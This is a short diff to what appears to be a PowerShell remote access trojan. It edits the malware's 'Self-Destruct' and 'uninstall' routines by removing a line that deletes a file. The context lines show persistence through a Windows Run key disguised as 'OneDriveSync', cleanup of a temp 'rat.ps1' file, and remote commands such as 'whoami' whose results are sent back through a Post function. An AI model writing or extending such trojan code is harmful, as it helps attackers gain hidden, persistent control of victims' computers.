@@ -245,7 +245,6 @@ function Self-Destruct{
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
     Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
     Remove-Item $HF -Force -EA 0
-        Remove-Item $S -Force -EA 0
         Post '`[+] self destructed`'
     exit
   }catch{ exit }
@@ -429,7 +428,6 @@ function Run-Cmd($c){
     elseif($c -eq 'uninstall'){
           Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
           Remove-Item $HF -Force -EA 0
-          Remove-Item $S -Force -EA 0
           Post '`[+] uninstalled`'; exit
         }
     elseif($c -eq 'whoami'){ Post (whoami) }
